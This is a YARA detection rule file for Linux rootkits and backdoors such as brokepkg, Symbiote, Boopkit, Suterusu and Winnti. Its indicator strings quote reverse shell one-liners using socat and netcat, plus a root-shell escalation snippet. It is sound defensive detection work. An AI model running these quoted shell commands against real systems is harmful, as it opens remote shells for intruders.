include "rules/magics.yar"
import "elf"
import "hash"


rule Diamorphine_Genneric {
  meta:
    description = "Detect open source Rootkit Diamorphine"
    github = "https://github.com/m0nad/Diamorphine/"
    md5 = "ede0f3dc66c6ec8c1ec9648e8118bced"
  strings:
    $ = "diamorphine_secret" fullword ascii
    $ = "include/linux/thread_info.h" fullword ascii
    $ = "kallsyms_lookup_name" fullword ascii
  condition:
    elf_rel and all of them
}

rule Father_Generic {
  meta:
    descriptions = "Detect .so binary file made"
    github = "https://github.com/mav8557/Father"
    md5 = "4f90604f04fe12f4e91b2bab13426fc0"
  strings:
    $ = "v-pY" fullword ascii
    $ = "^(Hd" fullword ascii
    $ = "lpe_drop_shell" fullword ascii
    $ = "falsify_tcp" fullword ascii
  condition:
    elf_dyn and 2 of them
}


rule BrokePkg_Generic {
  meta:
    description = "Kernel module file of brokepkg"
    github = "https://github.com/R3tr074/brokepkg"
    md5 = "bb19d79bc2523ed663ea0c26f49b6425"
  strings:
    $ = "br0k3_n0w_h1dd3n" fullword ascii
    $ = "fh_install_hook" fullword ascii
    $ = "6brokepkg" fullword ascii
    $ = "socat openssl-connect:%s:%s,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane" fullword ascii
    $ = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" fullword ascii
  condition:
    elf_rel and
    (
      for 3 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "fh_install_hooks" or
          elf.dynsym[i].name == "port_hide" or
          elf.dynsym[i].name == "hide_pid"
        )
      ) or
      2 of them
    )
}

rule Symbiote_a0d1 {
  meta:
    description = "ELF EXE file of 5 samples"
    md5 = "a0d1e1ec8207c83c7d2d52ff65f0e159"
  strings:
    $ = "TUNNEL_CONNECT" fullword ascii
    $ = "COMMAND_SHELL" fullword ascii
    $ = "./dnscat" fullword ascii
    $ = "Type = FIN" fullword ascii
  condition:
    elf_exec and all of them
}


rule Symbiote_0c27 {
  meta:
    description = "First DYN file of 5 samples"
    md5 = "0c278f60cc4d36741e7e4d935fd2972f"
    md5 = "59033839c1be695c83a68924979fab58"
    md5 = "4d8ebed6943ff05118baf30be9515b83"
    md5 = "87bb1d7e3639be2b21df8a7a273b60c8"
  strings:
    $h1 = "hidden_ports" fullword ascii
    $h2 = "hidden_address" fullword ascii
    $h3 = "hidden_file" fullword ascii
    $h4 = "hidden_proc" fullword ascii
    $s1 = "suporte42atendimento53log" fullword ascii
    $s2 = ">g^VI" fullword ascii
    $s3 = "px32.nss.atendimento-estilo.com" fullword ascii
  condition:
    elf_dyn and any of ($h*) and any of ($s*)
}


rule Boopkit_BoopExec {
  meta:
    github = "https://github.com/krisnova/boopkit"
    description = "Exec file of the toolkit"
    md5 = "7a00da9408fb313c09bb2208f2745354"
  strings:
    $ = "boopkit" fullword ascii
    $ = "[RCE]" fullword ascii
    $ = "X*x.HALT.x*X" fullword ascii
  condition:
    elf_exec and all of them
}


rule Boopkit_bfdf {
  meta:
    github = "https://github.com/krisnova/boopkit"
    description = "Boopkit's object files and an other exe file"
    md5 = "bfdfd5d8f11cbc262e5698e90a2b4f88"
    md5 = "3408129bbb1de313d986dc3577f267cb"
    md5 = "e1b4ef86cc780c40dad08d58d5bf6b99"
  strings:
    $ = "pr0be.boop.c" fullword ascii
    $ = "pr0be.safe.c" fullword ascii
    $ = "pr0be.xdp.c" fullword ascii
    $ = "event_boop_t" fullword ascii
    $ = "pid_to_hide" fullword ascii
    $ = "__packed" fullword ascii
    $ = "boopkit.h" fullword ascii
    $ = "Failed to hide PID" fullword ascii
    $ = "U>Fc" fullword ascii
  condition:
    (elf_rel or elf_exec or elf.type == elf.ET_EXEC) and
    (
      for 2 i in (0 .. elf.dynsym_entries):
      (
        (
          elf.dynsym[i].type == elf.STT_FUNC and
          (
            elf.dynsym[i].name == "pid_to_hide" or
            elf.dynsym[i].name == "boopprintf"
          )
        ) or
        (
          elf.dynsym[i].type == elf.STT_OBJECT and
          (
            elf.dynsym[i].name == "__packed" or
            elf.dynsym[i].name == "LICENSE" or
            elf.dynsym[i].name == "runtime__boopkit"
          )
        )
      ) or
      any of them
    )
}


rule Orbit_ba61 {
  meta:
    hash = "ba61e17c5fbcd6288081b31210f6cae6"
    description = "Orbit library file"
  strings:
    $1 = "load_hidden_ports" fullword ascii
    $2 = "tcp_port_hidden"  fullword ascii
    $3 = "sniff_ssh_session" fullword ascii
    $4 = "ld.so.nohwcap" fullword ascii
    $5 = "patch_ld" fullword ascii
  condition:
    elf_dyn and 3 of them
}


// rule HCRootkit_Generic {
//   meta:
//     description = "Detects Linux HCRootkit, as reported by Avast"
//     description = "Modified from original LaceworkLabs's rules"
//     author = "Lacework Labs"
//     ref = "https://www.lacework.com/blog/hcrootkit-sutersu-linux-rootkit-analysis/"
//   strings:
//     $a1 = "/tmp/.tmp_XXXXXX"
//     $a2 = "/proc/.inl"
//     $a3 = "rootkit"

//     $s1 = "s_hide_pids"
//     $s2 = "handler_kallsyms_lookup_name"
//     $s3 = "s_proc_ino"
//     $s4 = "n_filldir"
//     $s5 = "s_hide_tcp4_ports"
//     $s6 = "s_hide_strs"
//     $s7 = "kp_kallsyms_lookup_name"
//     $s8 = "s_hook_remote_ip"
//     $s9 = "s_hook_remote_port"
//     $s10 = "s_hook_local_port"
//     $s11 = "s_hook_local_ip"
//     $s12 = "nf_hook_pre_routing"
//   condition:
//     all of ($a*) or 5 of ($s*)
// }


rule Suterusu_Generic {
  meta:
    description = "Detects open source rootkit named suterusu"
    hash1 = "7e5b97135e9a68000fd3efee51dc5822f623b3183aecc69b42bde6d4b666cfe1"
    hash2 = "7b48feabd0ffc72833043b14f9e0976511cfde39fd0174a40d1edb5310768db3"
    author = "Lacework Labs"
    ref = "https://www.lacework.com/blog/hcrootkit-sutersu-linux-rootkit-analysis/"
  strings:
    $a1 = "suterusu"
    $a3 = "srcversion="
    $a4 = "Hiding PID"
    $a5 = "/proc/net/tcp"
  condition:
    elf_magic and all of them
}


rule Umbreon_Generic {
	meta:
		description = "Catches Umbreon rootkit"
		reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
		author = "Fernando Merces, FTR, Trend Micro"
		date = "2016-08"
	strings:
		$ = { 75 6e 66 75 63 6b 5f 6c 69 6e 6b 6d 61 70 }
		$ = "unhide.rb" fullword
		$ = "rkit" fullword
	condition:
		elf_dyn and all of them
}


rule Umbreon_Strace {
	meta:
		description = "Catches Umbreon strace rootkit component"
		reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
		author = "Fernando Merces, FTR, Trend Micro"
		date = "2016-08"
	strings:
		$ = "LD_PRELOAD" fullword
		$ = /ld\.so\.[a-zA-Z0-9]{7}/ fullword
		$ = "\"/etc/ld.so.preload\"" fullword
		$ = "fputs_unlocked" fullword
	condition:
		elf_dyn and all of them
}


rule Umbreon_Espeon {
	meta:
		description = "Catches Umbreon strace rootkit component"
		reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
		author = "Fernando Merces, FTR, Trend Micro"
		date = "2016-08"
	strings:
		$ = "Usage: %s [interface]" fullword
		$ = "Options:" fullword
		$ = "    interface    Listen on <interface> for packets." fullword
		$ = "/bin/espeon-shell %s %hu" fullword
		$ = { 66 75 63 6b 20 6f 66 66 20 63 75 6e 74 }
		$ = "error: unrecognized command-line options" fullword
	condition:
		elf_dyn and all of them
}


rule Chfn_Generic {
  strings:
    $ = "setpwnam" fullword ascii
  condition:
    elf_magic and all of them
}


rule Sckit_Generic {
  meta:
    description = "ELF:Sckit-A, Unix.Trojan.Suki-1, Backdoor:Linux/Rooter"
    refrence = "https://otx.alienvault.com/indicator/file/db4c0fe28e8fdce6f7b7e2e12738ff84f084667e07b408dc04dc92bd074bc0e2"
    md5 = "03d83a8223fe5dd37346c897a7f1ade5"
  strings:
    $ = "Can't execve shell" fullword ascii
    $ = "Failed to hide pid" fullword ascii
  condition:
    elf_magic and all of them
}


rule Brootkit_9659 {
  meta:
    md5 = "96597264b066ed19f273d8bd2e329996"
    url = "https://bazaar.abuse.ch/sample/371ce879928eb3f35f77bcb8841e90c5e0257638b67989dc3d025823389b3f79/"
    description = "A Bash script to install rootkit"
  strings:
    $ = "br_hide_engine" fullword ascii
    $ = "brootkit_func" fullword ascii
    $ = "br_hide_file" fullword ascii
    $ = "br_hide_proc" fullword ascii
    $ = "br_hide_port" fullword ascii
  condition:
    shebang_magic and 3 of them
}


rule Suckit_Generic {
  strings:
    $ = "Starting backdoor daemon" fullword ascii
    $ = "Backdoor made by" fullword ascii
    $ = "Can't execve shell" fullword ascii
    $ = "pqrstuvwxyzabcde" fullword ascii
    $ = "FUCK: Can't fork child" fullword ascii
    $ = "Please enter new rootkit password" fullword ascii
    $ = "Failed to hide pid" fullword ascii
    $ = "Failed to unhide pid" fullword ascii
  condition:
    elf_magic and 3 of them
}


// rule Knark_Generic {
//   meta:
// 		author = "Nong Hoang Tu <dmknght@parrotsec.org>"
// 		date = "17/11/2021"
// 	strings:
// 		$path_1 = "/usr/lib/.hax0r/sshd_trojan"
//     $path_2 = "/usr/local/sbin/sshd"
//     $path_3 = "/usr/lib/.hax0r"
//     $cmd_1 = "hidef"
//     $cmd_2 = "unhidef"
//     $cmd_3 = "nethides"
//     $cmd_4 = "verify_rexec"
//     $s1 = "Knark rexec verify-packet must be one of:"
//     $s2 = "nark %s by Creed @"
//     $s3 = "fikadags?"
//     $s4 = "%s -c (clear nethide-list)"
//     $s5 = "ex: %s www.microsoft.com 192.168.1.77 /bin/rm -fr /"
//     $s6 = "Have you really loaded knark.o?!"
//     $s7 = "alluid or allgid can be used to specify all *uid's or *gid's"
// 	condition:
// 		any of ($s*) or (
//       any of ($path*) and any of ($cmd*)
//     )
// }


// rule Ark_AR {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "06d8660ace1f3ef557a7df2e85623cce"
//   strings:
//     $1 = "Mmmkay.. Time to backdoor thiz slut.."
//     $2 = "Backdooring Completed"
//     $3 = "ARK-[ You may want to supply a password"
//     $4 = "ARK-[ Welcome to ARK"
//   condition:
//     2 of them
// }


// rule Ark_DU {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "58f6c91ca922aa3d6f6b79b218e62b46"
//   strings:
//     $path_1 = "/usr/lib/.ark"
//     $s1 = "ptyxx"
//     $s2 = "SUBJECT: `/sbin/ifconfig eth0 | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`"
//     $mail_1 = "tuiqoitu039t09q3@bigfoot.com"
//     $mail_2 = "bnadfjg9023@hotmail.com"
//     $mail_3 = "t391u9t0qit@end-war.com"
//     $mail_4 = "mki62969o@yahoo.com"
//   condition:
//     (is_elf and $path_1 and $s1) or $s2 or any of ($mail*)
// }


// rule Lrk_B_Fix {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "a29f6927825c948c5df847505fe2dd11"
//   strings:
//     $1 = "fix original replacement [backup]"
//     $2 = "Last 17 bytes not zero"
//     $3 = "Can't fix checksum"
//   condition:
//     $1 or ($2 and $3)
// }


// rule Lrk_B_Lled {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "bf10ff4214716f20bcd23227c6b6c0bb"
//   strings:
//     $1 = "/var/adm/lastlog"
//     $2 = "lastlog.tmp"
//     $3 = "Erase entry (y/n/f(astforward))?"
//     $4 = "/var/adm/wtmp"
//     $5 = "wtmp.tmp"
//   condition:
//     ($1 and $2) or ($4 and $5) and $3
// }


// rule Lrk_B_Z2 {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "0181b03af8360480baf346007ec76849"
//   strings:
//     $1 = "/etc/utmp"
//     $2 = "/usr/adm/wtmp"
//     $3 = "/usr/adm/lastlog"
//     $4 = /Zap[\d]/
//   condition:
//     all of them
// }


// rule Lrk_E_Sniffchk {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "82a61d8b23956703f164b06968a8e599"
//   strings:
//     $1 = "The_l0gz"
//     $3 = "Sniffer running"
//     $4 = "Restarting sniffer..."
//   condition:
//     is_elf and any of them
// }


// rule Lrk_E_BindhShell {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//     hash = "96702b7180082a00b2ced1a243360ed6"
//   strings:
//     $1 = "(nfsiod)"
//     $2 = "/bin/sh"
//   condition:
//     is_elf and all of them
// }


// rule Rkit_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//   strings:
//     $1 = "rootkit() failed!"
//     $2 = "password guesses exhausted"
//     $3 = "rkit by Deathr0w"
//     $4 = "deathr0w.speckz.com"
//   condition:
//     is_elf and any of them
// }


// rule Rkit_Pwd {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//   strings:
//     $1 = "./.rkpass"
//     $2 = "Enter a new password [1-8 characters]"
//     $3 = "Writing to file: %s failed! Exiting..."
//     $4 = "Opening of file: %s failed! Exiting..."
//     $5 = "Saved new password to file: %"
//   condition:
//     (is_elf and $1) or ($2 and $3 and $4 and $5)
// }


// rule Urk_Generic {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "17/11/2021"
//   strings:
//     $1 = "Inverses the bit's in a file to make it unreadable."
//     $2 = "@(#)log"
//     $3 = " (Berkeley) "
//     $4 = "UX:login: ERROR: Login incorrect"
//     $5 = "User %s (gid %d) from %s: %s"
//   condition:
//     is_elf and any of them
// }


// rule Ark_Lrkv {
//   strings:
//     $1 = "RadCxmnlogrtucpFbqisfL"
//     $2 = /@\(#\)[w]+.c/
//     $3 = "acCegjklnrStuvwxU"
//     $4 = "usage: du [-ars] [name ...]"
//     $5 = "du: No more processes"
//   condition:
//     any of them
// }


// rule Phalanx_B6 {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "29/11/2021"
//     reference = "https://packetstormsecurity.com/files/download/42556/phalanx-b6.tar.bz2"
//   strings:
//     $1 = "/sbin/ifconfig|grep inet|head -1|awk '{print $2}'|cut -f 2 -d :"
//     $2 = "phalanX beta 6 connected"
//     $4 = "uninstalling phalanx from the kernel"
//     $5 = "testing the userland process spawning code"
//   condition:
//     any of them
// }


// rule Adore_Generic {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "29/11/2021"
//     reference = "https://github.com/yaoyumeng/adore-ng"
//   strings:
//     $1 = "Failed to run as root. Trying anyway ..."
//     $2 = "Adore 1.%d installed. Good luck."
//     $3 = "Made PID %d invisible."
//     $4 = "ELITE_UID: %u, ELITE_GID=%u, ADORE_KEY=%s"
//     $5 = "Removed PID %d from taskstruct"
//   condition:
//     any of them
// }


// rule Bvp47_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "24/02/2022"
//     description = "NSA-linked Bvp47 Linux backdoor"
//     md5 = "58b6696496450f254b1423ea018716dc"
//     reference = "https://bazaar.abuse.ch/sample/7989032a5a2baece889100c4cfeca81f1da1241ab47365dad89107e417ce7bac/"
//   strings:
//     // Encrypted strings from binary
//     $long_1 = "e86dd99a33cb9df96e793518f659746f8cc3d9ac39413871f5afd58d7d00685ab0c449d62aa35c865a133dff"
//     $short_1 = "NWlas"
//     $short_2 = "qKizlbKRbFdM"
//     $short_3 = "xdkzVqtnab"
//     $short_4 = "ihRCzr"
//     $short_5 = "dXRuFsbUutDV"
//     $short_6 = "NcGNaOrdVC"
//   condition:
//     $long_1 or 4 of ($short_*)
// }


// todo atk rootkit https://github.com/millken/kdev/tree/master/4atk%201.05new
// 
// rule KokainKit { TODO: the script generates multiple scripts. I have to work to search match all of files.
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Kokain, Knark"
//     reference = "https://otx.alienvault.com/indicator/file/0e08cfb2d92b67ad67e7014e2e91849be3ef1b13c201b7ae928a1bab5a010b5b"
//     date = "12/11/2021"
//     target = "File, memory"
//   strings:
//     $1 = "TORNDIR=/usr/src/.puta"
//     $2 = "THEDIR=/usr/lib/$THEPASS"
//     $3 = "if ! test \"$(whoami)\" = \"root\"; then"
//   condition:
//     all of them
// }


// rule Agent_ed80 {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     hash = "ed80f05f474ba2471e5dc5611a900f4a"
//   strings:
//     $1 = "USAGE: %s dst-net-addr dst-port src-addr usleep-time"
//     $2 = "Randomizing port numbers"
//   condition:
//     all of them
// }


rule Rootkit_4d1e {
  meta:
    hash = "4d1e6120a5c05b709435925e967a7e43"
  strings:
    // Normal strings in /usr/bin/dir, /usr/bin/ls
    $ = "hide-control-chars" fullword ascii
    $ = "ignore-backups" fullword ascii
    // Uniq strings
    $ = "abcdfgiklmnopqrstuw:xABCDFGI:LNQRST:UX178" fullword ascii
  condition:
    elf_magic and all of them
}


rule Rootkit_a669 {
  meta:
    md5 = "1fccc4f70c2c800173b7c56558b74a95"
    md5 = "acf87e0165bc121eb384346d10c74997"
    descriptions = "Unknown Linux rootkit"
  strings:
    $ = "/proc/self/fd/%d" fullword ascii
    $ = "/proc/%s/stat" fullword ascii
    $ = "%d (%[^)]s" fullword ascii
    $ = "Error in dlsym: %s" fullword ascii
  condition:
    elf_dyn and all of them
}


rule Kinsing_ccef {
  meta:
    md5 = "ccef46c7edf9131ccffc47bd69eb743b"
    sha256 = "c38c21120d8c17688f9aeb2af5bdafb6b75e1d2673b025b720e50232f888808a"
    description = "Kinsing rootkit from malwareBazaar"
  strings:
    $ = "is_hidden_file.c" fullword ascii
    $ = "%d (%[^)]s" fullword ascii
    $ = "chopN" fullword ascii
  condition:
    elf_dyn and
    (
      for 2 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "is_hidden_file" or
          elf.dynsym[i].name == "is_attacker" or
          elf.dynsym[i].name == "hide_tcp_ports"
        )
      ) or
      all of them
    )
}


rule Winnti_7f47 {
  meta:
    md5 = "7f4764c6e6dabd262341fd23a9b105a3"
    sha256 = "ae9d6848f33644795a0cc3928a76ea194b99da3c10f802db22034d9f695a0c23"
  strings:
    $ = "HIDE_THIS_SHELL" fullword ascii
    $ = "10CSocks5Mgr" fullword ascii
  condition:
    elf_exec and all of them
}


rule Winnti_1acb {
  meta:
    md5 = "1acb326773d6ba28d916871cb91af844"
    sha256 = "3b378846bc429fdf9bec08b9635885267d8d269f6d941ab1d6e526a03304331b"
  strings:
    $ = "Yi-!*" fullword ascii
    $ = {(7c | 3d) (42 | 43) 66 4b}
    $ = "get_our_sockets" fullword ascii
    $ = "cmdlineH" fullword ascii
    $ = "is_invisible_with_pids" fullword ascii
  condition:
    elf_dyn and
    (
      for 2 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "is_invisible_with_pids" or
          elf.dynsym[i].name == "get_our_pids" or
          elf.dynsym[i].name == "get_our_sockets" or
          elf.dynsym[i].name == "check_is_our_proc_dir"
        )
      ) or
      2 of them
    )
}


rule Vbackdoor_Generic {
  meta:
    md5 = "b3a0336574fed5bdcd08668074922fcb"
    sha256 = "b33b3f3a6b85be99b02118b28ce34ad239705ce578e9da19db3c25e255dded78"
  strings:
    $ = "forge_proc_net_tcp" fullword ascii
    $ = "dlopen" fullword ascii
    $ = "#$&(" fullword ascii
    $ = "W @j" fullword ascii
  condition:
    elf_dyn and
    (
      for 2 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "forge_proc_net_tcp" or
          elf.dynsym[i].name == "dlopen"
        )
      ) or
      3 of them
    )
}

rule NsSploit_Gen1 {
  meta:
    url = "https://www.hybrid-analysis.com/sample/6ffbe23565bbd34805d3dc4364110bb9d6d733107f8f02d0cfd38859ab013cf8"
  strings:
    $ = "ofs-lib.so" fullword ascii
    $ = "/tmp/ns_sploit" fullword ascii
    $ = "cve_2015_1328_binary.c" fullword ascii
    $ = "e10adc3949ba59abbe56e057f20f883e" fullword ascii
  condition:
    elf_exec and 2 of them
}


rule Statiyicrhge_Gen1 {
  meta:
    url = "https://www.hybrid-analysis.com/sample/017a9d7290cf327444d23227518ab612111ca148da7225e64a9f6ebd253449ab"
  strings:
    $ = "statiyicrhge" fullword ascii
    $ = "gsdj500vt" fullword ascii
    $ = "whoamiqumxyv" fullword ascii
    $ = "lscpuwbbzeix" fullword ascii
    $ = "wallpsogjwf" fullword ascii
    $ = "lscpuwbbzeix" fullword ascii
    $ = "Unhiding self" fullword ascii
    $ = "BMCUJDPLBTQWRIED" fullword ascii
    $ = "path now hidden" fullword ascii
    $ = "ICMP backdoor" fullword ascii
    $ = "Accept backdoor port" fullword ascii
    $ = "sshd: xcfhxar" fullword ascii
  condition:
    elf_dyn and 5 of them
}


rule VnQE6mk_Gen1 {
  meta:
    url = "https://www.hybrid-analysis.com/sample/f1612924814ac73339f777b48b0de28b716d606e142d4d3f4308ec648e3f56c8"
  strings:
    $ = "libntpVnQE6mk" fullword ascii
    $ = "chown -R 920366:920366" fullword ascii
    $ = "exec ~/bin/python ~/bin/escalator" base64
    $ = "os.setreuid(0,0)" base64
    $ = "os.execv(\"/bin/bash\", (\"/bin/bash\", \"-i\"))" base64
    $ = "lib0UZ0LfvWZ.so" fullword ascii
  condition:
    elf_exec and 3 of them
}


rule LDPreload_bc62 {
  meta:
    url = "https://www.hybrid-analysis.com/sample/bc62adb9d444542a2206c4fc88f54f032228c480cd35d0be624923e168987a1c/5f5ac948b7b024659c4d9ca8"
  strings:
    $ = "LD_PRELOH" fullword ascii
    $ = "lib0pus.so" fullword ascii
    $ = "is_file_hidden" fullword ascii
  condition:
    elf_dyn and 2 of them
}
